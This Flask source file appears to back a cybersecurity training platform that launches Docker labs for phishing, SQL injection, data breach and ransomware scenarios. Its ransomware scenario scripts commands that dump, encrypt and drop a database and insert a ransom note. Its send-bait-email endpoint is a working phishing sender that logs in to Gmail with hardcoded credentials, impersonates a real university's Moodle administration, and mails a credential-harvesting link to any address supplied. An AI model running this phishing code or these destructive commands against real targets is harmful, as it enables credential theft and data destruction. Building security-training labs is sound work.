from flask import Flask, jsonify, request, session
from flask_cors import CORS
import subprocess
import docker
import threading
from datetime import timedelta
import time
import os
import mysql.connector
import requests
import shlex
import redis
import json 
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

app = Flask(__name__)
CORS(app, supports_credentials=True)
app.config.update(
    SECRET_KEY=os.urandom(24),
    SESSION_COOKIE_SECURE=True,  
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=5)
)

def get_redis_connection():
    try:
        return redis.Redis(
            host='172.22.0.3',  # Consider making this configurable depending on your redis ip address
            port=6379,
            db=0,
            socket_timeout=5,
            decode_responses=True  
        )
    except redis.ConnectionError as e:
        print(f"Redis connection error: {e}")
        return None


class TargetEnvironment:
    def __init__(self):
        self.docker_client = docker.from_env()
        self.containers = {}
        self.cleanup_thread = threading.Thread(target=self._cleanup_expired, daemon=True)
        self.current_port = 3000
        self.cleanup_thread.start()
        self.port_lock = threading.Lock()  # Add lock for thread-safe port assignment
        self.SESSION_TIMEOUT = 300

    def _get_next_port(self):
        """Thread-safe method to get the next available port"""
        with self.port_lock:
            next_port = self.current_port
            self.current_port = 3000 if self.current_port >= 3999 else self.current_port + 1
            return next_port

    def create_session_container(self, scenario_type):
        try:
            if scenario_type == 'phishing_analysis':
                # Create analysis container 
                container = self._create_phishing_container(
                    scenario_type=scenario_type,
                    db_config=None
                )

                container_id = container.id
                container_info = {
                    'container': container,
                    'created_at': time.time(),
                    'scenario': scenario_type,
                    'ip_address': container.attrs['NetworkSettings']['Networks']['beta_app_isolated_network']['IPAddress'],
                    'reference_count': 1
                }

                self.containers[container_id] = container_info
                return container_id

            elif scenario_type in ['sql_injection', 'data_breach', 'ransomware_analysis']:
                # Create MySQL container first
                mysql_container = self._create_mysql_container(
                    database='very_important_company_db',
                    user='target',
                    password='password123',
                    root_password='root123',
                    sql_file='init.sql'
                )

                # Wait for MySQL to be ready and get its IP
                mysql_ip = self._wait_for_mysql(mysql_container)

                # Create pentest container
                pentest_container = self._create_pentest_container(
                    scenario_type=scenario_type,
                    target_ip=mysql_ip
                )

                # Store containers and return pentest container ID
                container_id = pentest_container.id
                self.containers[container_id] = {
                    'container': pentest_container,
                    'db_container': mysql_container,
                    'created_at': time.time(),
                    'scenario': scenario_type,
                    'ip_address': pentest_container.attrs['NetworkSettings']['Networks']['beta_app_isolated_network']['IPAddress'],
                    'db_ip': mysql_ip,
                    'reference_count': 1
                }

                return container_id

            else:
                raise ValueError(f"Unsupported scenario type: {scenario_type}")

        except Exception as e:
            print(f"Error creating container for {scenario_type}: {str(e)}")
            raise

    def _create_mysql_container(self, database, user, password, root_password, sql_file, cmd=None):
        """Helper method to create and configure MySQL containers"""
        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            sql_path = os.path.join(current_dir, 'sql', sql_file)

            if not os.path.exists(sql_path):
                raise FileNotFoundError(f"SQL file not found: {sql_path}")

            container_config = {
                'image': 'mysql:8.0',
                'detach': True,
                'network': 'beta_app_isolated_network',
                'mem_limit': '512m',
                'cpu_period': 100000,
                'cpu_quota': 50000,
                'environment': {
                    'MYSQL_ROOT_PASSWORD': root_password,
                    'MYSQL_DATABASE': database,
                    'MYSQL_USER': user,
                    'MYSQL_PASSWORD': password
                },
                'ports': {'3306/tcp': None},
                'healthcheck': {
                    'test': ['CMD', 'mysqladmin', 'ping', '-h', 'localhost'],
                    'interval': 10000000000,  # 10 seconds
                    'timeout': 5000000000,    # 5 seconds
                    'retries': 5
                }
            }

            if cmd:
                container_config['command'] = cmd

            container = self.docker_client.containers.run(**container_config)

            # Copy and execute SQL file
            with open(sql_path, 'r') as f:
                sql_content = f.read()

            # Wait for MySQL to be ready before executing SQL
            time.sleep(30)  # Give MySQL time to initialize

            container.exec_run(
                f'mysql -uroot -p{root_password} {database} -e "{sql_content}"'
            )

            return container

        except Exception as e:
            print(f"Error creating MySQL container: {str(e)}")
            raise
    def _create_pentest_container(self, scenario_type, target_ip):
        """Create a pentesting container for security scenarios"""
        try:
            # Get next available port
            port = self._get_next_port()
            
            # Base environment variables
            environment = {
                'SCENARIO_TYPE': scenario_type,
                'TARGET_IP': target_ip
            }
            
            # Add scenario-specific environment variables
            if scenario_type == 'sql_injection':
                environment.update({
                    'MYSQL_HOST': target_ip,
                    'MYSQL_USER': 'web_user',
                    'MYSQL_PASSWORD': 'password123',
                    'MYSQL_DATABASE': 'very_important_company_db'
                })
            elif scenario_type in ['data_breach', 'ransomware_analysis']:
                environment.update({
                    'MYSQL_HOST': target_ip,
                    'MYSQL_USER': 'target',
                    'MYSQL_PASSWORD': 'password123',
                    'MYSQL_DATABASE': 'very_important_company_db'
                })

            # Create container with appropriate configuration
            container = self.docker_client.containers.run(
                'pentesting-tools:latest',  
                detach=True,
                network='beta_app_isolated_network',
                mem_limit='512m',
                ports={f"3000/tcp": port},
                cpu_period=100000,
                cpu_quota=50000,
                environment=environment,
                cap_add=['NET_ADMIN', 'NET_RAW'],
                security_opt=['seccomp=unconfined'],
            )
            
            # Store the assigned port with the container
            container.assigned_port = port
            return container

        except Exception as e:
            print(f"Error creating pentest container: {str(e)}")
            raise
    def _create_phishing_container(self, scenario_type, db_config):
        """Helper method to create analysis containers with cycling ports"""
        try:
            # Get the next available port
            port = self._get_next_port()
            
            container = self.docker_client.containers.run(
                'phishing-tools:latest',
                detach=True,
                network='beta_app_isolated_network',
                mem_limit='512m',
                ports={f"3000/tcp": port},  # Map container's 3000 to host's cycling port
                cpu_period=100000,
                cpu_quota=50000,
                cap_add=['NET_ADMIN', 'NET_RAW'],
                security_opt=['seccomp=unconfined'],
            )
            
            # Store the assigned port with the container
            container.assigned_port = port
            return container

        except Exception as e:
            print(f"Error creating analysis container: {str(e)}")
            raise

    def _wait_for_mysql(self, container, max_retries=30, retry_interval=2):
        """Helper method to wait for MySQL to be ready"""
        retry_count = 0
        while retry_count < max_retries:
            try:
                container.reload()
                if container.status != 'running':
                    raise Exception(f"Container is not running. Status: {container.status}")

                ip_address = container.attrs['NetworkSettings']['Networks']['beta_app_isolated_network']['IPAddress']

                result = container.exec_run(
                    'mysqladmin ping -h localhost',
                    environment={'MYSQL_PWD': container.attrs['Config']['Env'][0].split('=')[1]}
                )

                if result.exit_code == 0:
                    print("MySQL is ready for connections")
                    return ip_address

            except Exception as e:
                print(f"Waiting for MySQL to be ready... Attempt {retry_count + 1}/{max_retries}")
                print(f"Error: {str(e)}")

            retry_count += 1
            time.sleep(retry_interval)

        raise Exception("MySQL failed to become ready in time")

    def _store_containers(self, main_container, db_container, scenario_type):
        """Helper method to store container information"""
        container_id = main_container.id
        main_container.reload()

        container_info = {
            'container': main_container,
            'created_at': time.time(),
            'scenario': scenario_type,
            'ip_address': main_container.attrs['NetworkSettings']['Networks']['beta_app_isolated_network']['IPAddress'],
            'reference_count': 1
        }

        if db_container:
            container_info['db_container'] = db_container
            container_info['db_ip'] = db_container.attrs['NetworkSettings']['Networks']['beta_app_isolated_network']['IPAddress']

        self.containers[container_id] = container_info
        return container_id

    # Rest of the class methods remain unchanged
    def _cleanup_container(self, container_id):
        """Clean up containers including associated containers"""
        try:
            if container_id in self.containers:
                container_data = self.containers[container_id]

                # Decrease reference count
                container_data['reference_count'] -= 1

                # Only remove if reference count reaches 0
                if container_data['reference_count'] <= 0:
                    # Remove the main container
                    try:
                        container_data['container'].remove(force=True)
                    except Exception as e:
                        print(f"Error removing main container: {str(e)}")

                    # Remove the database container if it exists
                    if 'db_container' in container_data:
                        try:
                            container_data['db_container'].remove(force=True)
                        except Exception as e:
                            print(f"Error removing database container: {str(e)}")

                    del self.containers[container_id]

        except Exception as e:
            print(f"Error cleaning up container {container_id}: {str(e)}")

    def _cleanup_expired(self):
        """Cleanup thread to remove expired containers after session timeout"""
        while True:
            try:
                current_time = time.time()
                containers_to_check = dict(self.containers)
                
                for container_id, data in containers_to_check.items():
                    try:
                        # Check if container has expired (5 minutes timeout)
                        if current_time - data['created_at'] > self.SESSION_TIMEOUT:
                            # Check container exists and is running
                            data['container'].reload()
                            
                            # Check Redis for active session
                            redis_conn = get_redis_connection()
                            if redis_conn:
                                session_exists = redis_conn.exists(f'container_{container_id}')
                                if session_exists:
                                    # Update creation time if session is still active
                                    data['created_at'] = current_time
                                    continue

                            # Proceed with cleanup if no active session
                            try:
                                # Stop and remove main container
                                if data['container'].status == 'running':
                                    data['container'].stop(timeout=10)
                                data['container'].remove(force=True)
                                
                                # Clean up associated DB container if it exists
                                if 'db_container' in data:
                                    data['db_container'].reload()
                                    if data['db_container'].status == 'running':
                                        data['db_container'].stop(timeout=10)
                                    data['db_container'].remove(force=True)
                                
                                # Clean up Redis keys
                                if redis_conn:
                                    redis_conn.delete(f'container_{container_id}')
                                    redis_conn.delete(f'container_{container_id}_pwd')
                                
                                # Remove from containers dict
                                if container_id in self.containers:
                                    del self.containers[container_id]
                                    
                            except docker.errors.NotFound:
                                if container_id in self.containers:
                                    del self.containers[container_id]
                            except Exception as e:
                                print(f"Error removing container {container_id}: {str(e)}")
                                continue
                                
                    except docker.errors.NotFound:
                        if container_id in self.containers:
                            del self.containers[container_id]
                    except Exception as e:
                        print(f"Error checking container {container_id}: {str(e)}")
                        continue
                    
            except Exception as e:
                print(f"Error in cleanup thread: {str(e)}")
            
            # Check every 30 seconds instead of 5 minutes
            time.sleep(30)

    def get_container_ip(self, container_id):
        """Get IP address for a container"""
        if container_id in self.containers:
            return self.containers[container_id]['ip_address']
        return None

# Rest of the file remains unchanged

target_env = TargetEnvironment()

AVAILABLE_SCENARIOS = {
    'phishing_analysis': {
        'name': 'Phishing Awareness Simulator',
        'description': 'Educational platform for understanding phishing tactics',
        'tools': ['Open OS'],
        'difficulty': 'Beginner',
        'commands_order': ['View the phishing cred'],  # Add order list
        'commands': {
            'View the phishing cred': 'cat /home/logs/phishing_success.log',
        }
    },
    'sql_injection': {
        'name': 'SQL Injection Training',
        'description': 'Learn about SQL injection vulnerabilities through a simulated company database',
        'tools': ['MySQL Client', 'Basic SQL commands'],
        'difficulty': 'Beginner',
        'commands_order': [  
            'Connect to database',
            'Show tables',
            'View data'
        ],
        'commands': {
            'Connect to database': 'mysql -h TARGET_IP -u web_user -ppassword123 very_important_company_db',
            'Show tables': 'SHOW TABLES;',
            'View data': 'SELECT * FROM employees LIMIT 5;'
        }
    },
    'ransomware_analysis': {
        'name': 'Ransomware Impact Simulator',
        'description': 'Understand ransomware attacks and data protection through a safe simulation',
        'tools': ['MySQL Client', 'Basic Linux commands'],
        'difficulty': 'Advanced',
        'commands_order': [  
            'List databases',
            'Backup database',
            'Encrypt backup',
            'Delete original backup',
            'Delete database',
            'View ransom message',
            'Decrypt backup',
            'Create empty database',
            'Restore database'
        ],
        'commands': {
            'List databases': 'mysql -h TARGET_IP -u target -ppassword123 -e "SHOW DATABASES;"',
            'Backup database': 'mysqldump -h TARGET_IP -u target -ppassword123 very_important_company_db > database_backup.sql',
            'Encrypt backup': 'openssl enc -aes-256-cbc -salt -in database_backup.sql -out database_backup.enc -k your_password',
            'Delete original backup': 'rm database_backup.sql',
            'Delete database': 'mysql -h TARGET_IP -u target -ppassword123 -e "DROP DATABASE very_important_company_db; CREATE DATABASE RANSOMWARE_MESSAGE; USE RANSOMWARE_MESSAGE; CREATE TABLE message (id INT AUTO_INCREMENT PRIMARY KEY, content TEXT); INSERT INTO message (content) VALUES (\'⚠️ YOUR DATABASE HAS BEEN ENCRYPTED ⚠️\\n\\nYour Very important company *.* database has been compromised and all data has been encrypted!\\n\\nTo recover your data, you must:\\n1. Pay 5 Bitcoin to address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\\n2. Contact us at definitely-not-ransomware@totallylegit.com\\n3. Include your company ID: VICTIM-12345\\n\\nTime remaining: 48:00:00\\n\\nWARNING: Failure to pay within the time limit will result in permanent data loss!\\n\\nNote: This is a simulation - In a real scenario:\\n- Never pay the ransom\\n- Immediately disconnect affected systems\\n- Contact your IT security team\\n- Restore from secure backups\\n- Report to cybersecurity authorities\');"',
            'View ransom message': 'mysql -h TARGET_IP -u target -ppassword123 -e "SELECT content FROM RANSOMWARE_MESSAGE.message;"',
            'Decrypt backup': 'openssl enc -aes-256-cbc -d -in database_backup.enc -out database_backup.sql -k your_password',
            'Create empty database': 'mysql -h TARGET_IP -u target -ppassword123 -e "CREATE DATABASE very_important_company_db;"',
            'Restore database': 'mysql -h TARGET_IP -u target -ppassword123 very_important_company_db < database_backup.sql'
        }
    },
    'data_breach': {
        'name': 'Data Breach Prevention',
        'description': 'Learn to identify and prevent common data breach scenarios',
        'tools': ['MySQL Client', 'Network tools'],
        'difficulty': 'Beginner',
        'commands_order': [  # Add order list
            'Scan ports',
            'Check MySQL users',
            'View sensitive data'
        ],
        'commands': {
            'Scan ports': 'nmap TARGET_IP',
            'Check MySQL users': 'mysql -h TARGET_IP -u target -ppassword123 -e "SELECT user,host FROM mysql.user;"',
            'View sensitive data': 'mysql -h TARGET_IP -u target -ppassword123 -e "SELECT * FROM very_important_company_db.customer_data;"'
        }
    }
}

@app.route('/api/scenarios', methods=['GET'])
def get_scenarios():
    return jsonify(AVAILABLE_SCENARIOS)

@app.route('/api/start-scenario', methods=['POST'])
def start_scenario():
    try:
        scenario_type = request.json.get('type')
        if not scenario_type:
            return jsonify({'error': 'Scenario type is required'}), 400

        if scenario_type not in AVAILABLE_SCENARIOS:
            return jsonify({'error': 'Invalid scenario type'}), 400

        container_id = target_env.create_session_container(scenario_type)
        if not container_id:
            return jsonify({'error': 'Failed to create container'}), 500

        container_data = target_env.containers.get(container_id)
        if not container_data:
            return jsonify({'error': 'Container data not found'}), 500

        # Store container ID in both session and Redis with 5-minute expiration
        session['current_container'] = container_id
        redis_conn = get_redis_connection()
        if redis_conn:
            redis_conn.setex(
                f'container_{container_id}',
                300,  # 5 minutes expiration, matching Flask session
                container_id
            )

        # Determine target IP based on scenario type
        target_ip = None
        if scenario_type == 'phishing_analysis':
            target_ip = "No Target, You are the Master ^.^"
        else:
            target_ip = container_data.get('db_ip', container_data['ip_address'])

        return jsonify({
            'container_id': container_id,
            'scenario': AVAILABLE_SCENARIOS[scenario_type],
            'target_ip': target_ip
        })

    except Exception as e:
        print(f"Error in start_scenario: {e}")
        return jsonify({'error': 'Internal server error'}), 500
@app.route('/api/refresh-session', methods=['POST'])
def refresh_session():
    try:
        container_id = request.json.get('container_id')
        if not container_id:
            return jsonify({'error': 'Container ID is required'}), 400

        # Verify container exists
        container_data = target_env.containers.get(container_id)
        if not container_data:
            return jsonify({'error': 'Container not found'}), 404

        # Refresh both session and Redis expiration
        session['current_container'] = container_id
        redis_conn = get_redis_connection()
        if redis_conn:
            redis_conn.setex(
                f'container_{container_id}',
                300,  # 5 minutes expiration
                container_id
            )

        return jsonify({'message': 'Session refreshed successfully'})

    except Exception as e:
        print(f"Error refreshing session: {e}")
        return jsonify({'error': 'Internal server error'}), 500

def calculate_risk_score(data):
    # Implement risk scoring logic based on input patterns
    score = 0
    # Add scoring logic based on common phishing patterns
    return score

def _execute_command_safely(container_id, command):
    """Execute command with proper error handling and shell support"""
    try:
        container_data = target_env.containers.get(container_id)
        if not container_data:
            raise ValueError('Container not found')

        container = container_data['container']
        
        # Execute command in interactive bash shell
        exit_code, output = container.exec_run(
            cmd=["/bin/bash", "-c", command],
            demux=True,
            tty=True,
            workdir="/"  
        )
        return {
            'output': _format_command_output(output),
            'exit_code': exit_code,
            'container_id': container_id
        }
    except Exception as e:
        raise Exception(f'Command execution failed: {str(e)}')

def _format_command_output(output):
    """Format command output properly"""
    if isinstance(output, tuple):
        stdout, stderr = output
        response = ''
        if stdout:
            response += stdout.decode('utf-8', errors='replace')
        if stderr:
            response += stderr.decode('utf-8', errors='replace')
        return response.strip()
    return output.decode('utf-8', errors='replace').strip() if output else ''

@app.route('/api/execute-command', methods=['POST'])
def execute_command():
    try:
        command = request.json.get('command')
        container_id = request.json.get('container_id')

        if not command:
            return jsonify({'error': 'Command is required'}), 400

        # Validate container access
        if not _validate_container_access(container_id):
            return jsonify({'error': 'Invalid or expired container session'}), 401

        # Get container data to determine target IP
        container_data = target_env.containers.get(container_id)
        if not container_data:
            return jsonify({'error': 'Container not found'}), 404

        # Determine target IP based on scenario type
        target_ip = container_data.get('db_ip') if container_data.get('db_ip') else container_data['ip_address']
        
        # Replace TARGET_IP placeholder with actual IP
        command = command.replace('TARGET_IP', target_ip)

        # Special handling for cd command to maintain state
        if command.strip().startswith('cd'):
            redis_conn = get_redis_connection()
            if redis_conn:
                result = _execute_command_safely(container_id, f"{command} && pwd")
                if result['exit_code'] == 0:
                    new_pwd = result['output'].strip()
                    redis_conn.set(f'container_{container_id}_pwd', new_pwd)
                return jsonify(result)

        # For all other commands, execute with current working directory
        redis_conn = get_redis_connection()
        if redis_conn:
            current_pwd = redis_conn.get(f'container_{container_id}_pwd')
            if current_pwd:
                command = f"cd {current_pwd} && {command}"

        # Execute command
        result = _execute_command_safely(container_id, command)
        return jsonify(result)

    except Exception as e:
        print(f"Error in execute_command: {e}")
        return jsonify({'error': str(e)}), 500

def _validate_container_access(container_id):
    """Validate container access using both session and Redis"""
    session_container = session.get('current_container')
    redis_conn = get_redis_connection()
    redis_container = redis_conn.get(f'container_{container_id}') if redis_conn else None

    return container_id and (container_id == session_container or container_id == redis_container)




def execute_sql_command(command, container_data):
    try:
        # Handle MySQL shell commands
        if command.lower().startswith('mysql'):
            # For "show databases" and similar commands, execute them directly
            if 'show' in command.lower() or 'describe' in command.lower() or 'desc' in command.lower():
                query = command.split(None, 1)[1]  # Get everything after 'mysql'
            else:
                # Just establish connection for mysql client commands
                conn = mysql.connector.connect(
                    host=container_data['ip_address'],
                    user='web_user',
                    password='password123',
                    database='very_important_company_db'
                )
                cursor = conn.cursor(dictionary=True)
                cursor.execute("SELECT DATABASE()")
                result = cursor.fetchone()
                cursor.close()
                conn.close()
                return {
                    'output': f"Connected to {result['DATABASE()']}",
                    'exit_code': 0,
                    'container_id': container_data['container'].id
                }
        else:
            # Direct SQL queries
            query = command

        # Execute the query
        conn = mysql.connector.connect(
            host=container_data['ip_address'],
            user='web_user',
            password='password123',
            database='very_important_company_db'
        )

        cursor = conn.cursor(dictionary=True)

        # Handle multiple statements
        for statement in query.split(';'):
            if statement.strip():
                cursor.execute(statement.strip())

                if cursor.with_rows:
                    result = cursor.fetchall()
                    if result:
                        # Format each row as a tab-separated string
                        rows = []
                        # Add header
                        headers = result[0].keys()
                        rows.append('\t'.join(headers))
                        # Add data rows
                        for row in result:
                            rows.append('\t'.join(str(value) for value in row.values()))
                        formatted_output = '\n'.join(rows)
                    else:
                        formatted_output = "Query returned no results."
                else:
                    formatted_output = f"Query OK, {cursor.rowcount} rows affected"

        cursor.close()
        conn.close()

        return {
            'output': formatted_output,
            'exit_code': 0,
            'container_id': container_data['container'].id
        }

    except mysql.connector.Error as e:
        return {
            'error': f'MySQL Error: {str(e)}',
            'exit_code': 1,
            'container_id': container_data['container'].id
        }
    except Exception as e:
        return {
            'error': f'SQL command failed: {str(e)}',
            'exit_code': 1,
            'container_id': container_data['container'].id
        }

def execute_curl_command(command):
    try:
        parts = shlex.split(command)
        method = 'GET'
        url = None
        headers = {}
        data = None

        # Parse curl command
        i = 1
        while i < len(parts):
            if parts[i] == '-X':
                method = parts[i + 1]
                i += 2
            elif parts[i].startswith(('http://', 'https://')):
                url = parts[i]
                i += 1
            elif parts[i] == '-H':
                header_parts = parts[i + 1].split(':')
                headers[header_parts[0].strip()] = header_parts[1].strip()
                i += 2
            elif parts[i] == '-d':
                data = parts[i + 1]
                i += 2
            else:
                i += 1

        if not url:
            return {'error': 'No URL specified'}, 400

        response = requests.request(method, url, headers=headers, data=data)
        return {
            'output': response.text,
            'status_code': response.status_code
        }
    except Exception as e:
        return {'error': f'Curl command failed: {str(e)}'}, 500










@app.route('/api/send-bait-email', methods=['POST'])
def send_bait_email():
    try:
        # Get request data
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        target_email = data.get('email')
        container_id = data.get('container_id')  

        if not target_email:
            return jsonify({'error': 'Email address is required'}), 400
        if not container_id:
            return jsonify({'error': 'Container ID is required'}), 400

        # Validate container access using both session and Redis
        session_container = session.get('current_container')
        redis_conn = get_redis_connection()
        redis_container = redis_conn.get(f'container_{container_id}') if redis_conn else None

        if not (container_id == session_container or container_id == redis_container):
            return jsonify({'error': 'Invalid or expired container session'}), 401

        # Get container data
        container_data = target_env.containers.get(container_id)
        if not container_data:
            return jsonify({'error': 'Container not found'}), 404

        # Get the container's assigned port
        container = container_data['container']
        port = container.assigned_port

        # Use the specified IP address with dynamic port
        ip_address = "89.168.41.6"

        # Email configuration
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        real_email = "xxalexube@gmail.com"
        app_password = "wwbz yvkd arht ytcs"

        # Spoofed sender information
        spoofed_email = "admin@moodle2024.pcz.pl"
        display_name = "Moodle Administration"

        # Create HTML content with dynamic port
        html_body = f"""
            <html>
<body style="font-family: Arial, sans-serif; line-height: 1.6; background-color: #f9f9f9; padding: 20px;">
    <div style="max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <h2 style="color: #333;">Account Verification Required</h2>

        <p>Dear User,</p>

        <p>Thank you for using our Moodle system. To ensure the security and smooth functioning of your account, we require immediate verification.</p>

        <p style="font-size: 16px;">Please click the link below to log in and verify your account:</p>

        <p style="text-align: center;">
            <a href="http://{ip_address}:{port}" 
               style="display: inline-block; background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; font-size: 16px; border-radius: 5px;">
               Log In and Verify My Account
            </a>
        </p>

        <p>Once you log in, your account will be verified and remain active for the entire year.</p>

        <p style="margin-top: 20px;">Thank you for your prompt action.</p>

        <p style="color: #555;">Best regards,<br>
        Moodle Administration Team</p>

        <div style="margin-top: 30px; text-align: center;">
            <img src="https://cdn-public.softwarereviews.com/production/logos/offerings/59/large/2560px-Moodle-logo.svg.png" 
                 alt="Moodle Logo" 
                 style="width: 250px; margin: 10px;" 
                 class="logo"/>
            <img src="https://logowanie.man.pcz.pl/idp/images/logo_pcz_text.png" 
                 alt="Politechnika Częstochowska" 
                 style="width: 250px; margin: 10px;" 
                 class="logo"/>
        </div>
    </div>
</body>

            """

        # Create message
        message = MIMEMultipart('alternative')
        message["From"] = formataddr((display_name, spoofed_email))
        message["To"] = target_email
        message["Subject"] = "Moodle: Account Verification Required"
        message.attach(MIMEText(html_body, 'html'))

        # Add custom headers for better spoofing
        message.add_header('Reply-To', spoofed_email)
        message.add_header('Return-Path', spoofed_email)
        message.add_header('X-Sender', spoofed_email)
        message.add_header('X-Originating-Email', spoofed_email)

        # Send email using Gmail SMTP with detailed error handling
        with smtplib.SMTP(smtp_server, smtp_port, timeout=10) as server:
            server.set_debuglevel(1)  # Enable debug output
            server.starttls()
            server.login(real_email, app_password)
            server.send_message(message)

            # Store successful email data in Redis with dynamic port
            if redis_conn:
                email_data = {
                    'target_email': target_email,
                    'real_url': f"http://{ip_address}:{port}",
                    'display_url': 'https://moodle2024.pcz.pl/login',
                    'spoofed_sender': spoofed_email,
                    'timestamp': time.time(),
                    'status': 'sent',
                    'port': port,
                    'container_id': container_id
                }
                redis_conn.setex(
                    f'phishing_email_{int(time.time())}',
                    3600,
                    json.dumps(email_data)
                )

            return jsonify({
                'success': True,
                'message': f'Email sent successfully to {target_email}',
                'port': port,
                'container_id': container_id
            }), 200

    except Exception as e:
        print(f"Error sending bait email: {str(e)}")
        return jsonify({
            'error': f'Failed to send email: {str(e)}'
        }), 500











if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)